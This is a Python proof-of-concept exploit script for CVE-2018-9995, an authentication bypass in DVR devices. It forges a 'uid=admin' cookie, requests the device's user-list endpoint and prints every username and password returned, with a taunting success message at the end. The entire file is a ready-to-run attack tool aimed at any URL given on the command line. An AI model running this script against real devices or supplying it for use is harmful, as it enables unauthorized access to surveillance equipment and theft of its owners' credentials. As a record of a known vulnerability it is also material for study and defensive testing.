#!/bin/python3

import json
import requests
from rich.console import Console
import argparse

color = Console()

def check_vulnerability(url):
    vulnerable_path = "/device.rsp?opt=user&cmd=list"
    full_url = url + vulnerable_path

    headers = {
            "Cookie": "uid=admin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
            }

    color.print(f"[bold blue][*][/bold blue] [bold white]Checking if [bold red]{url}[/bold red] [bold white]is vulnerable[/bold white]")
    response = requests.get(full_url, headers=headers)

    if response.status_code == 200 or response.status_code == 302:
        color.print(f"[bold green][+][/bold green] [bold white]The target[/bold white] [bold red]{url}[/bold red] [bold white]is vulnerable[/bold white]")
        color.print(f"[bold blue][*][/bold blue] [bold white]Launching exploit[/bold white]")
        dump_credentials(url, response)
    else:
        color.print(f"[bold red][~][/bold red] [bold white]The target[/bold white] [bold red]{url}[/bold red] [bold white]is not vulnerable[/bold white]")

def dump_credentials(url, response):
    color.print("[bold blue][*][/bold blue] [bold white]Dumping credentials[/bold white]")
    color.print(f"[bold green][+][/bold green] [bold white](DVR)[/bold white] [bold blue]-[/bold blue] [bold red]{url}[/bold red]")
    json_data = response.text
    json_format = json.loads(json_data)
    for creds in json_format["list"]:
        username = creds["uid"]
        password = creds["pwd"]
        color.print("[bold green]╔═════════════════════════════════════════════════╗[/bold green]")
        color.print(f"[bold green]║[/bold green]    [bold yellow]Username[/bold yellow][bold blue]:[/bold blue] [bold magenta]{username:<30}[/bold magenta]     [bold green]║[/bold green]")
        color.print(f"[bold green]║[/bold green]    [bold yellow]Password[/bold yellow][bold blue]:[/bold blue] [bold magenta]{password:<30}[/bold magenta]     [bold green]║[/bold green]")
        color.print("[bold green]╚═════════════════════════════════════════════════╝[/bold green]")
    color.print("[bold blue][*][/bold blue] [bold white]Exploit was successful, have a nice day ;)[/bold white]")

def main():
    parser = argparse.ArgumentParser(description="CVE-2018-9995 - DVR Authentication Bypass PoC Exploit")
    parser.add_argument("url", help="Target URL")
    args = parser.parse_args()
    url = args.url

    check_vulnerability(url)

if __name__ == "__main__":
    main()
